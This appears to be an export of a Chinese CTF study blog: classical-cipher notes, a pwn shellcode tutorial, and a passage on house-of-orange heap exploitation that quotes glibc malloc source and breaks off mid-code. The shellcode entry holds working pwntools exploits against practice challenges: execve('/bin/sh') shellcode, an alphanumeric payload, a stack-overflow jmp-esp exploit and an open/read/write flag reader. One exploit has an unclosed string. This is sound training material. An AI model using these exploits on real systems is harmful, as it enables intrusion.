<h3 id="4-1多表替换原理"><a class="header-anchor" href="#4-1多表替换原理">¶</a>4.1多表替换原理</h3>
<pre><code>由于单表替换密码容易被频率分析破解，人们提出了多表替换加密，即用多个码表来依次对明文消息的字母进行代换。相较于单表替换，多表替换后，密文几乎不再保持原来的频率，所以更加难以破解，我们一般只能通过寻找算法实现对应的弱点进行破解。在多表替换中，以Playfair、Vigenere、Nihilist、Hill等较为出名，这里我们指选择分析其中的几种。
</code></pre>
<h3 id="4-2autokey-维吉尼亚"><a class="header-anchor" href="#4-2autokey-维吉尼亚">¶</a>4.2autokey/维吉尼亚</h3>
<pre><code>维吉尼亚密码，作为最经典的多表密码，其码表如下图：
码表第一排对应明文，第一列对应密钥。例如：
明文为：i like crypto
密钥为：nssctf
密文为：v damx heqhvh
</code></pre>
<p>破解<br>
由于维吉尼亚密码属于多表加密，所以一个字母可能被加密成不同的密文，由于密钥是重复使用的，所以只要知道了密钥的长度，就可以将其看成是交织在一起的凯撒密码，每一个都可以单独破解。密钥长度可以使用卡西斯基试验来得到。</p>
<p><img src="http://static.zybuluo.com/hgggg/er0k0mqmiaxoeo4ktiw98ioc/1587018-20191126194722022-992570273.jpg" alt="1587018-20191126194722022-992570273.jpg-207.2kB"></p>
<pre><code>Autokey与维吉尼亚密码密码类似，自动密钥密码（Autokey）主要有两种，关键词自动密钥密码和原文自动密钥密码。所以它比维吉尼亚更加安全。下面我们以关键词自动密钥为例：
明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG
关键词：CULTURE
自动生成密钥：CULTURE THE QUICK BROWN FOX JUMPS OVER THE
密文：VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK
</code></pre>
<h3 id="4-3希尔密码"><a class="header-anchor" href="#4-3希尔密码">¶</a>4.3希尔密码</h3>
<pre><code>希尔密码（Hill）使用每个字母在字母表中的顺序作为其对应的数字，即A=0，B=1，C=2 等，然后将明文转化为 n 维向量，跟一个 n × n 的矩阵相乘，再将得出的结果模 26。加密矩阵必须是可逆的，否则就不可能解码。只有矩阵的行列式和 26 互质，才是可逆的。
</code></pre>
<p>加密：<br>
<img src="http://static.zybuluo.com/hgggg/geep66492gw4cd9jwo6yamm1/123456%20%285%29.png" alt="123456 (5).png-68.1kB"><br>
解密：<br>
求出加密矩阵的逆矩阵然后同密文相乘后再对等到的矩阵模26(人懒就不上图了)</p>
<h2 id="5-其他密码"><a class="header-anchor" href="#5-其他密码">¶</a>5.其他密码</h2>
<h4 id="培根密码："><a class="header-anchor" href="#培根密码：">¶</a>培根密码：</h4>
<p><img src="http://static.zybuluo.com/hgggg/7alys7nj2040f01lc4mmbzj7/123456.png" alt="123456.png-19.2kB"></p>
<h4 id="栅栏密码："><a class="header-anchor" href="#栅栏密码：">¶</a>栅栏密码：</h4>
<pre><code>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。
</code></pre>
<h4 id="JSFuck"><a class="header-anchor" href="#JSFuck">¶</a>JSFuck:</h4>
<p>形如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br><span class="line">原作者github:https://github.com/aemkei/jsfuck</span><br></pre></td></tr></table></figure>
<h4 id="BrainFuck"><a class="header-anchor" href="#BrainFuck">¶</a>BrainFuck</h4>
<pre><code>一种极小众的计算机语言，由“&gt;、&lt;、+、-、.、,、[、]&quot;八个符号组成。该语言由目前有专门的解释器，感兴趣可以自行了解。
</code></pre>
<h4 id="猪圈及其变形"><a class="header-anchor" href="#猪圈及其变形">¶</a>猪圈及其变形</h4>
<pre><code>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/j5ds8cf7kr3ivkob7dbyhniv/123456.jpg" alt="123456.jpg-26.6kB"></p>
<h4 id="跳舞的小人"><a class="header-anchor" href="#跳舞的小人">¶</a>跳舞的小人</h4>
<pre><code>出自《福尔摩斯》的密码
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/g6nj57kk1444l2zizplrhla0/123456%20%282%29.jpg" alt="123456 (2).jpg-23.3kB"></p>
<h4 id="来自宇宙的信号"><a class="header-anchor" href="#来自宇宙的信号">¶</a>来自宇宙的信号</h4>
<p><img src="http://static.zybuluo.com/hgggg/9rbnfvwqapog0zs4at0bqzuw/20180310123813709.png" alt="20180310123813709.png-92.4kB"></p>
<h4 id="古精灵码"><a class="header-anchor" href="#古精灵码">¶</a>古精灵码</h4>
<p><img src="http://static.zybuluo.com/hgggg/zrn18wxlgf7gi88475gs61ni/55409313b07eca805f84325b982397dda044835e.jpg" alt="55409313b07eca805f84325b982397dda044835e.jpg-29.3kB"></p>
<pre><code>除了以上列出来的这些，还有盲文、数字盲文、音符加密、01248、与佛论禅等也曾出现在CTF比赛中。
</code></pre>
<h3 id="6-常用网站"><a class="header-anchor" href="#6-常用网站">¶</a>6.常用网站</h3>
<pre><code>http://ctf.ssleye.com/#
https://quipqiup.com/
</code></pre>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>古典密码</tag>
        <tag>crypto笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode</title>
    <url>/2021/10/04/shellcode/</url>
    <content><![CDATA[<h1>Shellcode</h1>
<h3 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h3>
<pre><code>在pwn中shellcode利用方式一般为触发中断（int 0x80 或 syscall）来进行系统调用
system(&quot;/bin/sh&quot;)，实际上就是调用execve(&quot;/bin/sh&quot;,0,0)
</code></pre>
<span id="more"></span>
<h3 id="示例程序"><a class="header-anchor" href="#示例程序">¶</a>示例程序</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -m32 1.c -o shell</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="syscall-调用表"><a class="header-anchor" href="#syscall-调用表">¶</a>syscall 调用表</h3>
<pre><code>https://publicki.top/syscall.html
</code></pre>
<h3 id="使用pwntools生成shellcode"><a class="header-anchor" href="#使用pwntools生成shellcode">¶</a>使用pwntools生成shellcode</h3>
<p>32位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;1386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
<p>64位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
<p>mips</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;mips&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh())</span><br></pre></td></tr></table></figure>
<p>arm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.aarch64.linux.sh())</span><br></pre></td></tr></table></figure>
<p><strong>坑</strong></p>
<pre><code>在运行生成mips和arm架构的shellcode时会有一系列的报错
这里给出解决方案
git clone https://github.com/Gallopsled/pwntools-binutils
cd pwntools-binutils/ubuntu
chmod +x install_all.sh
./install_all.sh arm
</code></pre>
<h3 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h3>
<h4 id="mrctf2020-shellcode"><a class="header-anchor" href="#mrctf2020-shellcode">¶</a>mrctf2020_shellcode</h4>
<p><img src="http://static.zybuluo.com/hgggg/8spatck2bpkcvt8mm9zt1fcz/1.png" alt="1.png-65.6kB"></p>
<p>从ida中我们可以看到，程序的功能为读入0x400字节，然后执行读入的内容<br>
<img src="http://static.zybuluo.com/hgggg/yy6gc7b9ficlvskr65bow8oi/2.png" alt="2.png-150.2kB"></p>
<p>同时栈上有可执行权限</p>
<p>那接下来编写exp</p>
<h5 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;sp&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26936</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;mrctf2020_shellcode&#x27;)</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e6922f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode1 = asm(shellcode1)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Show me your magic!&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是在CTF比赛中往往会对输入长度进行限制所以有时也需要自己编写shellcode</p>
<h4 id="mrctf2020-shellcode-revenge"><a class="header-anchor" href="#mrctf2020-shellcode-revenge">¶</a>mrctf2020_shellcode_revenge</h4>
<p>本题与上一题相似，不过却只能用可见字符构造shellcode,这里使用alpha3来生成<br>
<img src="http://static.zybuluo.com/hgggg/uh8qelgi14ohooggd5leq8xx/3.png" alt="3.png-91kB"></p>
<h5 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> ```python</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29931</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Show me your magic!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e6922f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode1 = asm(shellcode1)</span></span><br><span class="line"><span class="string">print(shellcode1)</span></span><br><span class="line"><span class="string">payload1 = &#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = &#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M150m0M0R2o7O2q0H0k10030O2J142M0H2N160Y0m0H18140l07121L0m0L121M0c7L0m1O0m0N0V0o11010H2L130R2j0l0l2t100Q0m0J110y2Z0m&#x27;</span></span><br><span class="line"><span class="string">r.send(payload1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure>
<h4 id="ciscn-s-6"><a class="header-anchor" href="#ciscn-s-6">¶</a>ciscn_s_6</h4>
<p>IDA分析<br>
<img src="http://static.zybuluo.com/hgggg/geyqzixywspeaygt9mbfbt63/4.png" alt="4.png-31.2kB"></p>
<p><img src="http://static.zybuluo.com/hgggg/8fpecaqjnig5pzidt5eziv8c/5.png" alt="5.png-14.8kB"><br>
思路</p>
<pre><code>pwn函数存在明显的栈溢出，我们可以通过读入shellcode并将返回地址覆盖为jmp esp之后去调用之前的shellcode
由于输入长度限制，本题需手写shellcode
</code></pre>
<h5 id="exp-v3"><a class="header-anchor" href="#exp-v3">¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x8048554</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26139</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;ciscn_s_9&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov al,0xb</span></span><br><span class="line"><span class="string">int 0x80                </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0</span>) +p32(ret_addr) + asm(<span class="string">&quot;sub esp,40;call esp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="pwnable-orw"><a class="header-anchor" href="#pwnable-orw">¶</a>pwnable_orw</h4>
<p>题目分析<br>
<img src="http://static.zybuluo.com/hgggg/mkqj8y9s162gf0du6t1o7cev/6.png" alt="6.png-42.5kB"></p>
<p><img src="http://static.zybuluo.com/hgggg/x6ddonudswawwmj20vq2fnl1/7.png" alt="7.png-40.7kB"></p>
<p>查看沙盒<br>
<img src="http://static.zybuluo.com/hgggg/ta0dkemu0ix3xwscl3snqfop/8.png#" alt="8.png-44.1kB"></p>
<p>发现只能使用open,read,write,那么我们就可以通过open(file)+read(file)+write(file)来实现任意文件读取</p>
<h5 id="exp-v4"><a class="header-anchor" href="#exp-v4">¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25539</span>)</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;orw&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>house_of_orange</title>
    <url>/2021/10/04/house-of-orange/</url>
    <content><![CDATA[<h1>house of orange</h1>
<h2 id="利用场景"><a class="header-anchor" href="#利用场景">¶</a>利用场景</h2>
<pre><code>无free函数的堆溢出：没有free函数，或者是无法调用free函数free指定的堆块
</code></pre>
<span id="more"></span>
<h2 id="malloc-top-chunk-源码分析"><a class="header-anchor" href="#malloc-top-chunk-源码分析">¶</a>malloc top chunk 源码分析</h2>
<p><img src="http://static.zybuluo.com/hgggg/l40dvsvhi9dxg2pbicbn4yiz/9.png" alt="9.png-18.8kB"><br>
如图所示，当我们可以从heap处溢出的时候，就可以覆盖top chunk的size和p_size（上面这张图画的时候画错了P打成D了）</p>
<p>接下来来看top chunk的源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">     here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当用户申请的chunk size小于top chunk size时，会从top chunk中分割一部分给用户使用</p>
<p>而当用户申请的chunk size大于top chunk size时，则会去调用sysmalloc</p>
<p>来看下syscall</p>
<p>如果arena为空或者需要分配的内存大小大于使用mmap进行分配的阀值mp_.mmap_threshold且mp_.n_mmaps判断系统还可以有可以使用mmap分配的空间，就会去调用mmap来分配内存</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">    || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line"> &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">  try_mmap:</span><br><span class="line">         <span class="comment">/* 省略 */</span></span><br></pre></td></tr></table></figure>
<p>接下来会对top chunk进行检查</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">old_top = av-&gt;top;      <span class="comment">/* top chunk 的指针 */</span></span><br><span class="line">old_size = chunksize (old_top);   <span class="comment">/* top chunk 的大小 */</span></span><br><span class="line">old_end = (<span class="keyword">char</span> *) (chunk_at_offset (old_top, old_size)); <span class="comment">/* top chunk 的尾部地址 */</span></span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="keyword">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这之后会对top chunk 进行扩展,当arena == main arena时会先调用grow_heap来扩展，若扩展失败，则会进入eles路线，最终触发 _int_free (av, old_top, 1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  &#123;</span><br><span class="line">    heap_info *old_heap, *heap;</span><br><span class="line">    <span class="keyword">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try to extend the current heap. */</span></span><br><span class="line">    old_heap = heap_for_ptr (old_top);</span><br><span class="line">    old_heap_size = old_heap-&gt;size;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">        &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">        arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">        set_head (old_top, (((<span class="keyword">char</span> *) old_heap + old_heap-&gt;size) - (<span class="keyword">char</span> *) old_top)</span><br><span class="line">                  | PREV_INUSE);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="keyword">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">      &#123;</span><br><span class="line">          ......</span><br><span class="line">        <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">            set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">            set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">            _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<p>同理，当arena != main_arena 时也会触发  _int_free (av, old_top, 1)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (snd_brk != (char *) (MORECORE_FAILURE))</span><br><span class="line">  &#123;</span><br><span class="line">    av-&gt;top = (mchunkptr) aligned_brk;</span><br><span class="line">    set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);</span><br><span class="line">    av-&gt;system_mem += correction;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">       If not the first time through, we either have a</span><br><span class="line">       gap due to foreign sbrk or a non-contiguous region.  Insert a</span><br><span class="line">       double fencepost at old_top to prevent consolidation with space</span><br><span class="line">       we don&#x27;t own. These fenceposts are artificial chunks that are</span><br><span class="line">       marked as inuse and are in any case too small to use.  We need</span><br><span class="line">       two to make sizes and alignments work out.</span><br><span class="line">     */</span><br><span class="line"></span><br><span class="line">    if (old_size != 0)</span><br><span class="line">      &#123;</span><br><span class="line">        /*</span><br><span class="line">           Shrink old_top to insert fenceposts, keeping size a</span><br><span class="line">           multiple of MALLOC_ALIGNMENT. We know there is at least</span><br><span class="line">           enough space in old_top to do this.</span><br><span class="line">         */</span><br><span class="line">        old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">        set_head (old_top, old_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">           Note that the following assignments completely overwrite</span><br><span class="line">           old_top when old_size was previously MINSIZE.  This is</span><br><span class="line">           intentional. We need the fencepost, even if old_top otherwise gets</span><br><span class="line">           lost.</span><br><span class="line">         */</span><br><span class="line">        chunk_at_offset (old_top, old_size)-&gt;size =</span><br><span class="line">          (2 * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">        chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)-&gt;size =</span><br><span class="line">          (2 * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">        /* If possible, release the rest. */</span><br><span class="line">        if (old_size &gt;= 